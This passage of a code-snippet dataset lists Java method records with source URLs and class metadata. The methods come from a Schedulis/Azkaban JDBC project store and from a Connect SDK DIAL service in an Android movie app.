"modifiers": ["public"]}}, {"method_name": "getBytes", "params": ["Props"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "byte", "snippet": "  private byte[] getBytes(final Props props) throws IOException {    final String propertyJSON = PropsUtils.toJSONString(props, true);    byte[] data = propertyJSON.getBytes(\"UTF-8\");    if (this.defaultEncodingType == EncodingType.GZIP) {      data = GZIPUtils.gzipBytes(data);    }    return data;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchProjectProperty", "params": ["int", "int", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props fetchProjectProperty(final int projectId, final int projectVer,      final String propsName) throws ProjectManagerException {    final ProjectPropertiesResultsHandler handler = new ProjectPropertiesResultsHandler();    try {      final List<Pair<String, Props>> properties =          this.dbOperator              .query(ProjectPropertiesResultsHandler.SELECT_PROJECT_PROPERTY, handler, projectId,                  projectVer,                  propsName);      if (properties == null || properties.isEmpty()) {        logger.debug(\"Project \" + projectId + \" version \" + projectVer + \" property \" + propsName            + \" is empty.\");        return null;      }      return properties.get(0).getSecond();    } catch (final SQLException e) {      logger.error(\"Error fetching property \" + propsName + \" Project \" + projectId + \" version \"          + projectVer, e);      throw new ProjectManagerException(\"Error fetching property \" + propsName, e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchProjectProperty", "params": ["Project", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props fetchProjectProperty(final Project project, final String propsName)      throws ProjectManagerException {    return fetchProjectProperty(project.getId(), project.getVersion(), propsName);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchProjectProperties", "params": ["int", "int"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "Map<String,Props>", "snippet": "  public Map<String, Props> fetchProjectProperties(final int projectId, final int version)      throws ProjectManagerException {    try {      final List<Pair<String, Props>> properties = this.dbOperator          .query(ProjectPropertiesResultsHandler.SELECT_PROJECT_PROPERTIES,              new ProjectPropertiesResultsHandler(), projectId, version);      if (properties == null || properties.isEmpty()) {        return null;      }      final HashMap<String, Props> props = new HashMap<>();      for (final Pair<String, Props> pair : properties) {        props.put(pair.getFirst(), pair.getSecond());      }      return props;    } catch (final SQLException e) {      logger.error(\"Error fetching properties, project id\" + projectId + \" version \" + version, e);      throw new ProjectManagerException(\"Error fetching properties\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "cleanOlderProjectVersion", "params": ["int", "int", "List<Integer>"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void cleanOlderProjectVersion(final int projectId, final int version,      final List<Integer> excludedVersions) throws ProjectManagerException {    // Would use param of type Array from transOperator.getConnection().createArrayOf() but    // h2 doesn't support the Array type, so format the filter manually.    final String EXCLUDED_VERSIONS_FILTER = excludedVersions.stream()        .map(excluded -> \" AND version != \" + excluded).collect(Collectors.joining());    final String VERSION_FILTER = \" AND version < ?\" + EXCLUDED_VERSIONS_FILTER;    final String DELETE_FLOW = \"DELETE FROM project_flows WHERE project_id=?\" + VERSION_FILTER;    final String DELETE_PROPERTIES =        \"DELETE FROM project_properties WHERE project_id=?\" + VERSION_FILTER;    final String DELETE_PROJECT_FILES =        \"DELETE FROM project_files WHERE project_id=?\" + VERSION_FILTER;    final String UPDATE_PROJECT_VERSIONS =        \"UPDATE project_versions SET num_chunks=0 WHERE project_id=?\" + VERSION_FILTER;    // Todo jamiesjc: delete flow files    final SQLTransaction<Integer> cleanOlderProjectTransaction = transOperator -> {      transOperator.update(DELETE_FLOW, projectId, version);      transOperator.update(DELETE_PROPERTIES, projectId, version);      transOperator.update(DELETE_PROJECT_FILES, projectId, version);      return transOperator.update(UPDATE_PROJECT_VERSIONS, projectId, version);    };    try {      final int res = this.dbOperator.transaction(cleanOlderProjectTransaction);      if (res == 0) {        logger.info(\"clean older project given project id \" + projectId + \" doesn't take effect.\");      }    } catch (final SQLException e) {      logger.error(\"clean older project transaction failed\", e);      throw new ProjectManagerException(\"clean older project transaction failed\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadFlowFile", "params": ["int", "int", "File", "int"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadFlowFile(final int projectId, final int projectVersion, final File flowFile,      final int flowVersion) throws ProjectManagerException {    logger.info(String        .format(            \"Uploading flow file %s, version %d for project %d, version %d, file length is [%d bytes]\",            flowFile.getName(), flowVersion, projectId, projectVersion, flowFile.length()));    if (flowFile.length() > MAX_FLOW_FILE_SIZE_IN_BYTES) {      throw new ProjectManagerException(\"Flow file length exceeds 10 MB limit.\");    }    final byte[] buffer = new byte[MAX_FLOW_FILE_SIZE_IN_BYTES];    final String INSERT_FLOW_FILES =        \"INSERT INTO project_flow_files (project_id, project_version, flow_name, flow_version, \"            + \"modified_time, \"            + \"flow_file) values (?,?,?,?,?,?)\";    try (final FileInputStream input = new FileInputStream(flowFile);        final BufferedInputStream bufferedStream = new BufferedInputStream(input)) {      final int size = bufferedStream.read(buffer);      logger.info(\"Read bytes for \" + flowFile.getName() + \", size:\" + size);      final byte[] buf = Arrays.copyOfRange(buffer, 0, size);      try {        this.dbOperator            .update(INSERT_FLOW_FILES, projectId, projectVersion, flowFile.getName(), flowVersion,                System.currentTimeMillis(), buf);      } catch (final SQLException e) {        throw new ProjectManagerException(            \"Error uploading flow file \" + flowFile.getName() + \", version \" + flowVersion + \".\",            e);      }    } catch (final IOException e) {      throw new ProjectManagerException(          String.format(              \"Error reading flow file %s, version: %d, length: [%d bytes].\",              flowFile.getName(), flowVersion, flowFile.length()));    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "getUploadedFlowFile", "params": ["int", "int", "String", "int", "File"], "throws": ["ProjectManagerException", "IOException"], "modifiers": ["public"], "return_type": "File", "snippet": "  public File getUploadedFlowFile(final int projectId, final int projectVersion,      final String flowFileName, final int flowVersion, final File tempDir)      throws ProjectManagerException, IOException {    final FlowFileResultHandler handler = new FlowFileResultHandler();    final List<byte[]> data;    // Created separate temp directory for each flow file to avoid overwriting the same file by    // multiple threads concurrently. Flow file name will be interpret as the flow name when    // parsing the yaml flow file, so it has to be specific.    final File file = new File(tempDir, flowFileName);    try (final FileOutputStream output = new FileOutputStream(file);        final BufferedOutputStream bufferedStream = new BufferedOutputStream(output)) {      try {        data = this.dbOperator            .query(FlowFileResultHandler.SELECT_FLOW_FILE, handler,                projectId, projectVersion, flowFileName, flowVersion);      } catch (final SQLException e) {        throw new ProjectManagerException(            \"Failed to query uploaded flow file for project \" + projectId + \" version \"                + projectVersion + \", flow file \" + flowFileName + \" version \" + flowVersion, e);      }      if (data == null || data.isEmpty()) {        throw new ProjectManagerException(            \"No flow file could be found in DB table for project \" + projectId + \" version \" +                projectVersion + \", flow file \" + flowFileName + \" version \" + flowVersion);      }      bufferedStream.write(data.get(0));    } catch (final IOException e) {      throw new ProjectManagerException(          \"Error writing to output stream for project \" + projectId + \" version \" + projectVersion              + \", flow file \" + flowFileName + \" version \" + flowVersion, e);    }    return file;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "getLatestFlowVersion", "params": ["int", "int", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getLatestFlowVersion(final int projectId, final int projectVersion,      final String flowName) throws ProjectManagerException {    final IntHandler handler = new IntHandler();    try {      return this.dbOperator.query(IntHandler.SELECT_LATEST_FLOW_VERSION, handler, projectId,          projectVersion, flowName);    } catch (final SQLException e) {      logger.error(e);      throw new ProjectManagerException(          \"Error selecting latest flow version from project \" + projectId + \", version \" +              projectVersion + \", flow \" + flowName + \".\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "isFlowFileUploaded", "params": ["int", "int"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isFlowFileUploaded(final int projectId, final int projectVersion)      throws ProjectManagerException {    final FlowFileResultHandler handler = new FlowFileResultHandler();    final List<byte[]> data;    try {      data = this.dbOperator          .query(FlowFileResultHandler.SELECT_ALL_FLOW_FILES, handler,              projectId, projectVersion);    } catch (final SQLException e) {      logger.error(e);      throw new ProjectManagerException(\"Failed to query uploaded flow files \", e);    }    return !data.isEmpty();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "updatePermission", "params": ["Project", "String", "Permission", "boolean", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updatePermission(final Project project, final String name, final Permission perm,      final boolean isGroup,      final String group)      throws ProjectManagerException {    final long updateTime = System.currentTimeMillis();    try {      if (this.dbOperator.getDataSource().allowsOnDuplicateKey()) {        final String INSERT_PROJECT_PERMISSION =            \"INSERT INTO project_permissions (project_id, modified_time, name, permissions, isGroup, project_group) values (?,?,?,?,?,?)\"                + \"ON DUPLICATE KEY UPDATE modified_time = VALUES(modified_time), permissions = VALUES(permissions)\";        this.dbOperator            .update(INSERT_PROJECT_PERMISSION, project.getId(), updateTime, name, perm.toFlags(),                isGroup, group);      } else {        final String MERGE_PROJECT_PERMISSION =            \"MERGE INTO project_permissions (project_id, modified_time, name, permissions, isGroup, project_group) KEY (project_id, name) values (?,?,?,?,?,?)\";        this.dbOperator            .update(MERGE_PROJECT_PERMISSION, project.getId(), updateTime, name, perm.toFlags(),                isGroup, group);      }    } catch (final SQLException ex) {      logger.error(\"Error updating project permission\", ex);      throw new ProjectManagerException(          \"Error updating project \" + project.getName() + \" permissions for \" + name, ex);    }    if (isGroup) {      project.setGroupPermission(group, perm);      project.setUserPermission(name, perm);    } else {      project.setUserPermission(name, perm);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchAllPermissionsForProject", "params": ["Project"], "throws": ["ProjectManagerException"], "modifiers": ["private"], "return_type": "List<ProjectPermission>", "snippet": "  private List<ProjectPermission> fetchAllPermissionsForProject(      final Project project)      throws ProjectManagerException {    final ProjectAllPermissionsResultHandler permHander = new ProjectAllPermissionsResultHandler();    List<ProjectPermission> projectPermissionList = null;    try {      projectPermissionList =          this.dbOperator              .query(ProjectPermissionsResultHandler.SELECT_PROJECT_PERMISSION, permHander,                  project.getId());    } catch (final SQLException ex) {      logger.error(ProjectPermissionsResultHandler.SELECT_PROJECT_PERMISSION + \" failed.\", ex);      throw new ProjectManagerException(          \"Query for permissions for \" + project.getName() + \" failed.\", ex);    }    return projectPermissionList;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "setProjectAllPermission", "params": ["Project", "ProjectPermission"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setProjectAllPermission(final Project project, final ProjectPermission projectPermission) {    if (projectPermission.getIsGroup()) {      project.setGroupPermission(projectPermission.getProjectGroup(), projectPermission.getPermission());      project.setUserPermission(projectPermission.getUsername(), projectPermission.getPermission());    } else {      project.setUserPermission(projectPermission.getUsername(), projectPermission.getPermission());    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "removeProjectPermission", "params": ["Project", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void removeProjectPermission(final Project project, final String userId)      throws ProjectManagerException {    final String DELETE_PROJECT_PERMISSION =        \"DELETE FROM project_permissions WHERE project_id=? AND name=? \";    try {      this.dbOperator.update(DELETE_PROJECT_PERMISSION, project.getId(), userId);    } catch (final SQLException e) {      logger.error(\"remove Permission failed.\", e);      throw new ProjectManagerException(          \"Error deleting project \" + project.getName() + \" permissions for \" + userId, e);    }    project.removeUserPermission(userId);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "getTodayCreateProjects", "params": ["String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "List<Project>", "snippet": "  public List<Project> getTodayCreateProjects(final String username) throws ProjectManagerException {    final ProjectResultHandler handler = new ProjectResultHandler();    List<Project> projects = null;    final List<Object> params = new ArrayList<>();    try {      String serchSQL = \"\";      if(null != username){        serchSQL = \"SELECT p.id, p.name, p.active, p.modified_time, p.create_time, p.version, p.last_modified_by, \"            + \"p.description, p.create_user, p.enc_type, p.settings_blob \"            + \"FROM projects p, project_permissions pp \"            + \"WHERE active=true AND p.id = pp.project_id \"            + \"AND pp.name=? \";        params.add(username);      }else{        serchSQL = \"SELECT id, name, active, modified_time, create_time, version, last_modified_by, description, create_user, enc_type, settings_blob FROM projects p \"            + \"WHERE active=true \";      }      Calendar calendar = Calendar.getInstance();      //\u83b7\u53d6\u5f53\u5929\u51cc\u6668\u6beb\u79d2\u6570      calendar.set(Calendar.HOUR_OF_DAY, 0);      calendar.set(Calendar.MINUTE, 0);      calendar.set(Calendar.SECOND, 0);      calendar.set(Calendar.MILLISECOND, 1);      serchSQL += \" AND create_time >= ?\";      params.add(calendar.getTimeInMillis());      //\u83b7\u53d6\u5f53\u592924\u70b9\u6beb\u79d2\u6570      calendar.set(Calendar.HOUR_OF_DAY, 23);      calendar.set(Calendar.MINUTE, 59);      calendar.set(Calendar.SECOND, 59);      serchSQL += \" AND create_time <= ?\";      params.add(calendar.getTimeInMillis());      projects = this.dbOperator.query(serchSQL, handler, params.toArray());      projects.forEach(project -> {        for (final ProjectPermission projectPermission : fetchAllPermissionsForProject(project)) {          setProjectAllPermission(project, projectPermission);        }      });    } catch (final SQLException ex) {      logger.error(ex);      throw new ProjectManagerException(\"\u67e5\u627e\u5f53\u65e5\u65b0\u5efa\u9879\u76ee\u5217\u8868SQL\u6267\u884c\u5f02\u5e38\uff01\", ex);    }    return projects;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "getTodayRunFlow", "params": ["int", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getTodayRunFlow(int projectId, String flowName) throws ProjectManagerException{    final IntHandler handler = new IntHandler();    final List<Object> params = new ArrayList<>();    String serchSQL = \"SELECT count(*) FROM execution_flows WHERE project_id =? AND flow_id = ?\";    params.add(projectId);    params.add(flowName);    Calendar calendar = Calendar.getInstance();    //\u83b7\u53d6\u5f53\u5929\u51cc\u6668\u6beb\u79d2\u6570    calendar.set(Calendar.HOUR_OF_DAY, 0);    calendar.set(Calendar.MINUTE, 0);    calendar.set(Calendar.SECOND, 0);    calendar.set(Calendar.MILLISECOND, 1);    serchSQL += \" AND submit_time >= ?\";    params.add(calendar.getTimeInMillis());    //\u83b7\u53d6\u5f53\u592924\u70b9\u6beb\u79d2\u6570    calendar.set(Calendar.HOUR_OF_DAY, 23);    calendar.set(Calendar.MINUTE, 59);    calendar.set(Calendar.SECOND, 59);    serchSQL += \" AND submit_time <= ?\";    params.add(calendar.getTimeInMillis());    try {      return this.dbOperator.query(serchSQL, handler, params.toArray());    } catch (final SQLException e) {      logger.error(e);      throw new ProjectManagerException(          \"Statistics Program \" + projectId + \" Flow \" + flowName + \" Exception number of execute SQL in a day \", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "setStrokeColor", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStrokeColor(int color) {        mStrokeColor = color;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/StrokedRobotoTextView.java", "stars": "4", "class": {"name": "StrokedRobotoTextView", "extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"method_name": "setStrokeWidth", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStrokeWidth(int unit, int size) {        Context c = getContext();        Resources r;        if (c == null)            r = Resources.getSystem();        else            r = c.getResources();        mStrokeWidth = TypedValue.applyDimension(unit, size, r.getDisplayMetrics());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/StrokedRobotoTextView.java", "stars": "4", "class": {"name": "StrokedRobotoTextView", "extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDraw", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {        ColorStateList states = getTextColors();        getPaint().setStyle(Paint.Style.STROKE);        getPaint().setStrokeWidth(mStrokeWidth);        setTextColor(mStrokeColor);        super.onDraw(canvas);        getPaint().setStyle(Paint.Style.FILL);        setTextColor(states);        super.onDraw(canvas);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/StrokedRobotoTextView.java", "stars": "4", "class": {"name": "StrokedRobotoTextView", "extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"method_name": "registerApp", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void registerApp(String appId) {        if (!registeredApps.contains(appId))            registeredApps.add(appId);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "getPriorityLevel", "params": ["Class<CapabilityMethods>"], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getPriorityLevel(Class<? extends CapabilityMethods> clazz) {        if (clazz.equals(Launcher.class)) {            return getLauncherCapabilityLevel();        }        return CapabilityPriorityLevel.NOT_SUPPORTED;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "discoveryFilter", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "DiscoveryFilter", "snippet": "    public static DiscoveryFilter discoveryFilter() {        return new DiscoveryFilter(ID, \"urn:dial-multiscreen-org:service:dial:1\");    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "setServiceDescription", "params": ["ServiceDescription"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setServiceDescription(ServiceDescription serviceDescription) {        super.setServiceDescription(serviceDescription);        Map<String, List<String>> responseHeaders = this.getServiceDescription().getResponseHeaders();         if (responseHeaders != null) {            String commandPath;            List<String> commandPaths = responseHeaders.get(\"Application-URL\");            if (commandPaths != null && commandPaths.size() > 0) {                commandPath = commandPaths.get(0);                this.getServiceDescription().setApplicationURL(commandPath);            }        }        probeForAppSupport();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "getLauncher", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Launcher", "snippet": "    public Launcher getLauncher() {        return this;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "getLauncherCapabilityLevel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getLauncherCapabilityLevel() {        return CapabilityPriorityLevel.NORMAL;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchApp", "params": ["String", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchApp(String appId, AppLaunchListener listener) {        launchApp(appId, null, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchApp", "params": ["String", "JSONObject", "AppLaunchListener"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void launchApp(String appId, JSONObject params, AppLaunchListener listener) {        if (appId == null || appId.length() == 0) {            Util.postError(listener, new ServiceCommandError(0, \"Must pass a valid appId\", null));            return;        }        AppInfo appInfo = new AppInfo();        appInfo.setName(appId);        appInfo.setId(appId);        launchAppWithInfo(appInfo, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchAppWithInfo", "params": ["AppInfo", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchAppWithInfo(AppInfo appInfo, AppLaunchListener listener) {        launchAppWithInfo(appInfo, null, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchAppWithInfo", "params": ["AppInfo", "Object", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchAppWithInfo(final AppInfo appInfo, Object params, final AppLaunchListener listener) {        ServiceCommand<ResponseListener<Object>> command = new ServiceCommand<ResponseListener<Object>>(this, requestURL(appInfo.getName()), params, new ResponseListener<Object>() {            @Override            public void onError(ServiceCommandError error) {                Util.postError(listener, new ServiceCommandError(0, \"Problem Launching app\", null));            }            @Override            public void onSuccess(Object object) {                LaunchSession launchSession = LaunchSession.launchSessionForAppId(appInfo.getId());                launchSession.setAppName(appInfo.getName());                launchSession.setSessionId((String)object);                launchSession.setService(DIALService.this);                launchSession.setSessionType(LaunchSessionType.App);                Util.postSuccess(listener, launchSession);            }        });        command.send();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchBrowser", "params": ["String", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchBrowser(String url, AppLaunchListener listener) {        Util.postError(listener, ServiceCommandError.notSupported());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "closeApp", "params": ["LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeApp(final LaunchSession launchSession, final ResponseListener<Object> listener) {        getAppState(launchSession.getAppName(), new AppStateListener() {            @Override            public void onSuccess(AppState state) {                String uri = requestURL(launchSession.getAppName());                if (launchSession.getSessionId().contains(\"http://\")                        || launchSession.getSessionId().contains(\"https://\"))                    uri = launchSession.getSessionId();                else if (launchSession.getSessionId().endsWith(\"run\")                        || launchSession.getSessionId().endsWith(\"run/\"))                    uri = requestURL(launchSession.getAppId() + \"/run\");                else                    uri = requestURL(launchSession.getSessionId());                ServiceCommand<ResponseListener<Object>> command =                        new ServiceCommand<ResponseListener<Object>>(launchSession.getService(),                                uri, null, listener);                command.setHttpMethod(ServiceCommand.TYPE_DEL);                command.send();            }            @Override            public void onError(ServiceCommandError error) {                Util.postError(listener, error);            }        });    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchYouTube", "params": ["String", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchYouTube(String contentId, AppLaunchListener listener) {        launchYouTube(contentId, (float) 0.0, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchYouTube", "params": ["String", "float", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchYouTube(String contentId, float startTime, AppLaunchListener listener) {        String params = null;        AppInfo appInfo = new AppInfo(\"YouTube\");        appInfo.setName(appInfo.getId());        if (contentId != null && contentId.length() > 0) {            if (startTime < 0.0) {                if (listener != null) {                    listener.onError(new ServiceCommandError(0, \"Start time may not be negative\", null));                }                return;            }            String pairingCode = java.util.UUID.randomUUID().toString();            params = String.format(Locale.US, \"pairingCode=%s&v=%s&t=%.1f\", pairingCode, contentId, startTime);        }        launchAppWithInfo(appInfo, params, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchHulu", "params": ["String", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchHulu(String contentId, AppLaunchListener listener) {        Util.postError(listener, ServiceCommandError.notSupported());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchNetflix", "params": ["String", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchNetflix(final String contentId, AppLaunchListener listener) {        JSONObject params = null;        if (contentId != null && contentId.length() > 0) {            try {                new JSONObject() {{                    put(\"v\", contentId);                }};            } catch (JSONException e) {                // TODO Auto-generated catch block                e.printStackTrace();            }        }        AppInfo appInfo = new AppInfo(\"Netflix\");        appInfo.setName(appInfo.getId());        launchAppWithInfo(appInfo, params, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": 